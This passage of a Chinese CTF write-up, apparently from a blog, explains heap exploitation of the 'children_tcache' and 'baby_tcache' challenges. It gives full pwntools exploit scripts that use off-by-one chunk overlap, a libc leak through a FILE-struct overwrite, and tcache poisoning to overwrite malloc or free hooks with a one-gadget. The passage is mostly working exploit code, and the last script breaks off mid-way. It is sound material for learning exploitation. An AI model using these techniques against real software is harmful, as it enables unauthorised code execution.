delete_heap(0)</span><br><span class="line"></span><br><span class="line"># overlapping</span><br><span class="line">new_heap(0x68, &quot;a&quot; * 0x60 + p64(0x580) + &quot;\n&quot;) # 0</span><br><span class="line">delete_heap(2)</span><br><span class="line">new_heap(0x500, &quot;a\n&quot;)     # 1</span><br><span class="line">data = show_heap(0)</span><br><span class="line">libc_addr = u64(data[0:6] + &quot;\x00\x00&quot;) - 0x3dac78</span><br><span class="line">libc.address = libc_addr</span><br><span class="line">print hex(libc_addr)</span><br><span class="line"></span><br><span class="line">new_heap(0x68, &quot;a\n&quot;)      # 2  2 == 0</span><br><span class="line">delete_heap(0)</span><br><span class="line">delete_heap(2)</span><br><span class="line">print hex(libc.symbols[&apos;__malloc_hook&apos;])</span><br><span class="line">new_heap(0x68, p64(libc.symbols[&apos;__malloc_hook&apos;]) + &quot;\n&quot;)</span><br><span class="line">new_heap(0x68, &quot;a\n&quot;)</span><br><span class="line">new_heap(0x68, p64(libc_addr + 0xfdb8e) + &quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="baby-tcache"><a href="#baby-tcache" class="headerlink" title="baby_tcache"></a>baby_tcache</h1><p>相比于children_tcache，该程序没有提供visit的功能。</p>
+<p>思路如下:</p>
+<ol>
+<li>构造7个chunk</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">allocate(0x4f0, &quot;aa\n&quot;) # 0</span><br><span class="line">allocate(0x30, &quot;aa\n&quot;)  # 1</span><br><span class="line">allocate(0x60, &quot;aa\n&quot;)  # 2</span><br><span class="line">allocate(0x20, &quot;aa\n&quot;)  # 3</span><br><span class="line">allocate(0x78, &quot;aa\n&quot;)  # 4</span><br><span class="line">allocate(0x4f0, &quot;aa\n&quot;) # 5</span><br><span class="line">allocate(0x70, &quot;aa\n&quot;)  # 6</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>删除0，通过off_by_one，覆盖5的size字段，构造overlapping</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># overlapping</span><br><span class="line">free(0)</span><br><span class="line">free(4)</span><br><span class="line">allocate(0x78, &quot;a&quot; * 0x70 + p64(0x660) + &quot;\n&quot;) # 0</span><br><span class="line">free(5)</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li><p>leak libc，具体可参考:</p>
+<ul>
+<li><a href="https://wally0813.github.io/exploit%20tech/ctf%20write%20up/2018/10/23/file_struct_flag/" rel="external nofollow" target="_blank">https://wally0813.github.io/exploit%20tech/ctf%20write%20up/2018/10/23/file_struct_flag/</a></li>
+<li><a href="https://vigneshsrao.github.io/babytcache/" rel="external nofollow" target="_blank">https://vigneshsrao.github.io/babytcache/</a></li>
+</ul>
+</li>
+<li><p>通过tcache poisoning，任意地址写</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">allocate(0x70, &quot;a&quot;) # 8 == 0</span><br><span class="line">free(8)</span><br><span class="line">free(0)</span><br><span class="line">allocate(0x70, p64(free_hook))     # 0</span><br><span class="line">allocate(0x70, &quot;a&quot;)                # 8</span><br><span class="line">allocate(0x70, p64(one_gadget))    # 9</span><br><span class="line">free(0)</span><br></pre></td></tr></table></figure>
+<p>完整exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#r = remote(host,port)</span><br><span class="line">r = process(&quot;./baby_tcache&quot;)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">def allocate(size,data):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;1&quot;)</span><br><span class="line">    r.recvuntil(&quot;e:&quot;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&quot;a:&quot;)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;2&quot;)</span><br><span class="line">    r.recvuntil(&quot;x:&quot;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">allocate(0x4f0, &quot;aa\n&quot;) # 0</span><br><span class="line">allocate(0x30, &quot;aa\n&quot;)  # 1</span><br><span class="line">allocate(0x60, &quot;aa\n&quot;)  # 2</span><br><span class="line">allocate(0x20, &quot;aa\n&quot;)  # 3</span><br><span class="line">allocate(0x78, &quot;aa\n&quot;)  # 4</span><br><span class="line">allocate(0x4f0, &quot;aa\n&quot;) # 5</span><br><span class="line">allocate(0x70, &quot;aa\n&quot;)  # 6</span><br><span class="line"></span><br><span class="line"># overlapping</span><br><span class="line">free(0)</span><br><span class="line">free(4)</span><br><span class="line">allocate(0x78, &quot;a&quot; * 0x70 + p64(0x660) + &quot;\n&quot;) # 0</span><br><span class="line">free(5)</span><br><span class="line"></span><br><span class="line"># leak libc</span><br><span class="line">free(2)                   # 进入 tcache 0x30</span><br><span class="line">allocate(0x530, &quot;c&quot;)     # 2</span><br><span class="line">allocate(0x90, &quot;\x60\xe7&quot;) # 4</span><br><span class="line">allocate(0x60, &quot;da&quot;)       # 5</span><br><span class="line">#attach(r)</span><br><span class="line"># 7 将0x60替换成0x20,0x30,0x50,0x60都可以,但是0x40不行，不知道为什么？？？？</span><br><span class="line">allocate(0x60, p64(0xfbad1800) + p64(0) * 3 + &quot;\x00&quot;)</span><br><span class="line">libc = u64(r.recvuntil(&quot;\xff\xff&quot;)[8:16]) - 0x3ed8b0</span><br><span class="line">print hex(libc)  # after this step, the binary exits immediately</span><br><span class="line">one_gadget = libc + 0x4f322</span><br><span class="line">free_hook = libc + 0x3ed8e8</span><br><span class="line"></span><br><span class="line"># tcache poisoning</span><br><span class="line">allocate(0x70, &quot;a&quot;) # 8 == 0</span><br><span class="line">free(8)</span><br><span class="line">free(0)</span><br><span class="line">allocate(0x70, p64(free_hook))     # 0</span><br><span class="line">allocate(0x70, &quot;a&quot;)                # 8</span><br><span class="line">allocate(0x70, p64(one_gadget))    # 9</span><br><span class="line">free(0)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>爆破12bits:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line"></span><br><span class="line"># 12 bits of libc addresses!</span><br><span class="line">def exploit():</span><br><span class="line">    # allocate four chunks A, X, B, C</span><br><span class="line">    A = fit(filler=&quot;A&quot;, length=0x608)</span><br><span class="line">    new_heap(A)</span><br><span class="line"></span><br><span class="line">    X = fit(filler=&quot;X&quot;, length=0x20)</span><br><span class="line">    new_heap(X)</span><br><span class="line"></span><br><span class="line">    B = fit(filler=&quot;B&quot;, length=0x1808)</span><br><span class="line">    new_heap(B)</span><br><span class="line"></span><br><span class="line">    C = fit(filler=&quot;C&quot;, length=0x4F0)</span><br><span class="line">    new_heap(C)</span><br><span class="line"></span><br><span class="line">    # allocate chunks T1 and T2 of size 0x20 (the why is explained later)</span><br><span class="line">    T1 = fit(filler=&quot;T1&quot;, length=0x20)</span><br><span class="line">    new_heap(T1)</span><br><span class="line"></span><br><span class="line">    T2 = fit(filler=&quot;T2&quot;, length=0x20)</span><br><span class="line">    new_heap(T2)</span><br><span class="line"></span><br><span class="line">    # allocate chunk T3 of size 0x20...</span><br><span class="line">    T3 = fit(filler=&quot;T3&quot;, length=0x20)</span><br><span class="line">    new_heap(T3)</span><br><span class="line">    # ...and free it, so that it is put in `tcache-&gt;entries[1]`</span><br><span class="line">    delete_heap(6)</span><br><span class="line">    # now `tcache-&gt;entries[1]` contains the address of T3, whose `next` pointer is set to NULL,</span><br><span class="line">    # i.e. `tcache-&gt;entries[1] = T3 -&gt; NULL`</span><br><span class="line"></span><br><span class="line">    # free chunk X (of size 0x20), which is also put in `tcache-&gt;entries[1]`</span><br><span class="line">    delete_heap(1)</span><br><span class="line">    # now `tcache-&gt;entries[1] = X -&gt; T3 -&gt; NULL`</span><br><span class="line"></span><br><span class="line">    # free chunk B...</span><br><span class="line">    delete_heap(2)</span><br><span class="line">    # ...and promptly reallocate it (as B1), to override the least significative byte of</span><br><span class="line">    # the `mchunk_size` field of chunk C with \0 (off-by-one NULL byte overflow)</span><br><span class="line">    C_prev_size = 0x610 + 0x30 + 0x1810</span><br><span class="line">    B1 = fit(&#123;0x1800: C_prev_size&#125;, filler=&quot;B1&quot;, length=0x1808)</span><br><span class="line">    new_heap(B1)</span><br><span class="line">    # chunk B1 lies exactly in between chunks X and C (as chunk B did before)</span><br><span class="line"></span><br><span class="line">    # having altered the `mchunk_size` field of C, chunk B1 is seen as not-in-use (even though it is); thus,</span><br><span class="line">    # the last 8 bytes of B1 (which we control) are interpreted as the `mchunk_prev_size` field of C</span><br><span class="line"></span><br><span class="line">    # here, we have set the `mchunk_prev_size` of C so that, instead of pointing to the start of</span><br><span class="line">    # chunk B (as it should), it points to the start of chunk A</span><br><span class="line"></span><br><span class="line">    # we now free chunk C with corrupted `mchunk_prev_size`, coalescing the whole block of heap from</span><br><span class="line">    # chunk A to the end of C with the top chunk</span><br><span class="line">    # (before freeing C, we free A so to pass the check `corrupted size vs. mchunk_prev_size`)</span><br><span class="line">    delete_heap(0)</span><br><span class="line">    delete_heap(3)</span><br><span class="line">    # being between chunks A and C, chunk X was also merged into the top chunk; but</span><br><span class="line">    # the address of X is still in `tcache-&gt;entries[1]`</span><br><span class="line"></span><br><span class="line">    # allocate chunk L (for padding)...</span><br><span class="line">    L = fit(filler=&quot;L&quot;, length=0x600)</span><br><span class="line">    new_heap(L)</span><br><span class="line">    # ...and allocate M, which is assigned the same address that X had!</span><br><span class="line">    M = fit(filler=&quot;M&quot;, length=0x1000)</span><br><span class="line">    new_heap(M)</span><br><span class="line"></span><br><span class="line">    # now, free M so that it goes in the unsorted bin and populates its `fd` and `bk` fields</span><br><span class="line">    # with addresses from libc (i.e. the address of the unsorted bin)</span><br><span class="line">    delete_heap(2)</span><br><span class="line">    # since M and X have the same address, the `next` pointer of X (coincident with the `fd` field of M)</span><br><span class="line">    # is also overwritten with the address of the unsorted bin</span><br><span class="line">    # now `tcache-&gt;entries[1] = X (== M) -&gt; UNSORTED_BIN_ADDR -&gt; ???`</span><br><span class="line"></span><br><span class="line">    # if we allocate two chunks of size 0x20, these will be pulled from `tcache-&gt;entries[1]`,</span><br><span class="line">    # and the second chunk will start exactly at `UNSORTED_BIN_ADDR`</span><br><span class="line"></span><br><span class="line">    # our end goal is to write into `__malloc_hook` the address of a one-gadget</span><br><span class="line">    # to do so, we need to:</span><br><span class="line">    # 1) make malloc returning the address of `__malloc_hook`-0x10, so to write 0x31 at `__malloc_hook`-0x10</span><br><span class="line">    #    and create a fake chunk of size 0x20 starting at `__malloc_hook`</span><br><span class="line">    # 2) make malloc returning the address of `__malloc_hook`, and save the pointer</span><br><span class="line">    # 3) put at the top of the `tcache-&gt;entries[1]` bin the address of a one-gadget</span><br><span class="line">    # 4) free the `__malloc_hook` chunk, which goes into `tcache-&gt;entries[1]` and `__malloc_hook` is</span><br><span class="line">    #    updated with the address of the one-gadget (which was at the top of `tcache-&gt;entries[1]`)</span><br><span class="line">    # 5) call `malloc()` to trigger the execution of `__malloc_hook()`</span><br><span class="line"></span><br><span class="line">    # we now continue the exploit proceeding with step 1)</span><br><span class="line"></span><br><span class="line">    # we reallocate M as M1, specifying a size of 0x1000 but providing only 3 bytes of data</span><br><span class="line">    # (the 3 least significative bytes of the address of `__malloc_hook`-0x10)</span><br><span class="line">    M1 = p32(__malloc_hook_addr - 0x10 &amp; 0xFFFFFF)[:-1]</span><br><span class="line">    new_heap(M1, size=0x1000)</span><br><span class="line">    # since, once again, M1 overlaps with X, with this reallocation we changed the lowest 3 bytes of</span><br><span class="line">    # the `next` pointer of X (which was `UNSORTED_BIN_ADDR` and is now the address of `__malloc_hook`-0x10)</span><br><span class="line"></span><br><span class="line">    # as said a few lines above, we malloc a chunk of size 0x20 to first pull X from `tcache-&gt;entries[1]`...</span><br><span class="line">    Z = fit(filler=&quot;Z&quot;, length=0x20)</span><br><span class="line">    new_heap(Z)</span><br><span class="line">    # ...and then a second chunk of size 0x20 to pull our chosen address of libc...</span><br><span class="line">    W = &quot;AAAABBBB&quot; + p64(0x31)</span><br><span class="line">    new_heap(W, size=0x20)</span><br><span class="line">    # ...which we used to set the `mchunk_size` field of the (imaginary) chunk starting at `__malloc_hook`</span><br><span class="line">    # to 0x31 (i.e. 0x20 (chunk data) + 0x10 (chunk headers) + 0x1 (PREV_INUSE bit))</span><br><span class="line"></span><br><span class="line">    # since we artificially added an entry in `tcache-&gt;entries[1]` by modifying a `next` pointer</span><br><span class="line">    # from NULL to `__malloc_hook`-0x10, the two consecutive allocations of chunks Z and W (both of size 0x20)</span><br><span class="line">    # had the side effect of setting `tcache-&gt;counts[1]` to -1, invalidating the possibility</span><br><span class="line">    # of using `tcache-&gt;entries[1]` anymore</span><br><span class="line"></span><br><span class="line">    # so, before moving on, we restore `tcache-&gt;counts[1]` to a positive number by freeing chunks T1 and T2</span><br><span class="line">    # (i.e. putting them into `tcache-&gt;entries[1]`), allocated at the start of the exploit for this exact reason</span><br><span class="line">    delete_heap(4)</span><br><span class="line">    delete_heap(5)</span><br><span class="line"></span><br><span class="line">    # ######################################################################## #</span><br><span class="line"></span><br><span class="line">    # now, we repeat the exact same process as above to make malloc returning exactly</span><br><span class="line">    # the address of `__malloc_hook`, completing step 2)</span><br><span class="line"></span><br><span class="line">    A = fit(filler=&quot;A&quot;, length=0xD20)</span><br><span class="line">    new_heap(A)</span><br><span class="line"></span><br><span class="line">    X = fit(filler=&quot;X&quot;, length=0x20)</span><br><span class="line">    new_heap(X)</span><br><span class="line"></span><br><span class="line">    B = fit(filler=&quot;B&quot;, length=0x1808)</span><br><span class="line">    new_heap(B)</span><br><span class="line"></span><br><span class="line">    C = fit(filler=&quot;C&quot;, length=0x4F0)</span><br><span class="line">    new_heap(C)</span><br><span class="line"></span><br><span class="line">    # free chunk X which goes in `tcache-&gt;entries[1]`</span><br><span class="line">    delete_heap(5)</span><br><span class="line"></span><br><span class="line">    # free chunk B...</span><br><span class="line">    delete_heap(7)</span><br><span class="line">    # ...and promptly reallocate it (as B1), to override the least significative byte of</span><br><span class="line">    # the `mchunk_size` field of chunk C with \0 (off-by-one NULL byte overflow)</span><br><span class="line">    C_prev_size = 0xD30 + 0x30 + 0x30 + 0x30 + 0x1810</span><br><span class="line">    B1 = fit(&#123;0x1800: C_prev_size&#125;, filler=&quot;B1&quot;, length=0x1808)</span><br><span class="line">    new_heap(B1)</span><br><span class="line">    # chunk B1 lies exactly in between chunks X and C (as chunk B did before)</span><br><span class="line"></span><br><span class="line">    # as explained before, free chunk A and in turn C...</span><br><span class="line">    delete_heap(4)</span><br><span class="line">    delete_heap(8)</span><br><span class="line">    # ...so to merge back X into the top chunk; but X is also in `tcache-&gt;entries[1]`</span><br><span class="line"></span><br><span class="line">    # allocate chunk L (for padding)...</span><br><span class="line">    L = fit(filler=&quot;L&quot;, length=0xD30 - 0x10 + 0x30)</span><br><span class="line">    new_heap(L)</span><br><span class="line">    # ...and allocate M, which is assigned the same address that X had!</span><br><span class="line">    M = fit(filler=&quot;M&quot;, length=0x1000)</span><br><span class="line">    new_heap(M)</span><br><span class="line"></span><br><span class="line">    # allocate any chunk after M, so that when we free M it doesn&apos;t coalesce with the top chunk</span><br><span class="line">    Z = fit(filler=&quot;Z&quot;, length=0x1000)</span><br><span class="line">    new_heap(Z)</span><br><span class="line"></span><br><span class="line">    # now, free M so that it goes in the unsorted bin and populates its `fd` and `bk` fields</span><br><span class="line">    # with the address of the unsorted bin</span><br><span class="line">    delete_heap(7)</span><br><span class="line"></span><br><span class="line">    # reallocate M as M1, specifying a size of 0x1000 but providing only 3 bytes of data</span><br><span class="line">    # (the 3 least significative bytes of the address of `__malloc_hook`)</span><br><span class="line">    M1 = p32(__malloc_hook_addr &amp; 0xFFFFFF)[:-1]</span><br><span class="line">    new_heap(M1, size=0x1000)</span><br><span class="line">    # since M1 overlaps with X, with this reallocation we changed the lowest 3 bytes of</span><br><span class="line">    # the `next` pointer of X (which was `UNSORTED_BIN_ADDR` and is now the address of `__malloc_hook`)</span><br><span class="line"></span><br><span class="line">    # as explained before, we malloc a chunk of size 0x20 to first pull X from `tcache-&gt;entries[1]`...</span><br><span class="line">    Z = fit(filler=&quot;Z&quot;, length=0x20)</span><br><span class="line">    new_heap(Z)</span><br><span class="line"></span><br><span class="line">    # (free chunks we don&apos;t use anymore, since the binary allows to use</span><br><span class="line">    # at maximum 10 &quot;heaps&quot; (as it calls them) at a time)</span><br><span class="line">    delete_heap(0)</span><br><span class="line"></span><br><span class="line">    # ...and then a second chunk of size 0x20 to pull our chosen address of libc...</span><br><span class="line">    W = &quot;\0&quot;</span><br><span class="line">    new_heap(W, size=0x20)</span><br><span class="line">    # ...in which we write \0 (so not to trigger any involuntary calls to `__malloc_hook`)</span><br><span class="line"></span><br><span class="line">    # we now have a pointer to `__malloc_hook`</span><br><span class="line"></span><br><span class="line">    # (free chunks we don&apos;t use anymore, since the binary allows to use</span><br><span class="line">    # at maximum 10 &quot;heaps&quot; (as it calls them) at a time)</span><br><span class="line">    delete_heap(2)</span><br><span class="line">    delete_heap(4)</span><br><span class="line">    delete_heap(7)</span><br><span class="line">    delete_heap(8)</span><br><span class="line"></span><br><span class="line">    # ######################################################################## #</span><br><span class="line"></span><br><span class="line">    # now, we repeat the exact same process as above to put the address of a one-gadget</span><br><span class="line">    # at the top of the `tcache-&gt;entries[1]` bin, completing step 3)</span><br><span class="line"></span><br><span class="line">    A = fit(filler=&quot;A&quot;, length=0xD20)</span><br><span class="line">    new_heap(A)</span><br><span class="line"></span><br><span class="line">    X = fit(filler=&quot;X&quot;, length=0x20)</span><br><span class="line">    new_heap(X)</span><br><span class="line"></span><br><span class="line">    B = fit(filler=&quot;B&quot;, length=0x1808)</span><br><span class="line">    new_heap(B)</span><br><span class="line"></span><br><span class="line">    C = fit(filler=&quot;C&quot;, length=0x4F0)</span><br><span class="line">    new_heap(C)</span><br><span class="line"></span><br><span class="line">    # free chunk X which goes in `tcache-&gt;entries[1]`</span><br><span class="line">    delete_heap(4)</span><br><span class="line"></span><br><span class="line">    # free chunk B...</span><br><span class="line">    delete_heap(7)</span><br><span class="line">    # ...and promptly reallocate it (as B1), to override the least significative byte of</span><br><span class="line">    # the `mchunk_size` field of chunk C with \0 (off-by-one NULL byte overflow)</span><br><span class="line">    C_prev_size = 0xD30 + 0x30 + 0x1810</span><br><span class="line">    B1 = fit(&#123;0x1800: C_prev_size&#125;, filler=&quot;B1&quot;, length=0x1808)</span><br><span class="line">    new_heap(B1)</span><br><span class="line">    # chunk B1 lies exactly in between chunks X and C (as chunk B did before)</span><br><span class="line"></span><br><span class="line">    # as explained before, free chunk A and in turn C...</span><br><span class="line">    delete_heap(2)</span><br><span class="line">    delete_heap(8)</span><br><span class="line">    # ...so to merge back X into the top chunk; but X is also in `tcache-&gt;entries[1]`</span><br><span class="line"></span><br><span class="line">    # allocate chunk L (for padding)...</span><br><span class="line">    L 